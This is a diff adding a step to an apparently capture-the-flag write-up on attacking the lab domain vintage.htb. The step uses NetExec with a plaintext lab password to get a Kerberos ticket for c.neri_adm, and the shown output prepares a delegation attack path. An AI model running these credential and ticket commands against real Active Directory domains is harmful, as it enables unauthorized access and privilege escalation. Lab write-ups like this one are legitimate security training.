@@ -388,3 +388,17 @@ DC01$            Computer     Unconstrained               N/A                 Ye
 ```
 
 For this attack path to work ill need an account with an SPN set, if i recall `FS01$` had one set so i can use that
+
+Ill also need a TGT for the user `c.neri_adm`:
+```python
+nxc smb dc01.vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k --generate-tgt c.neri_adm
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: c.neri_adm.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=c.neri_adm.ccache
+
+
+export KRB5CCNAME=c.neri_adm.ccache
+```
+
+
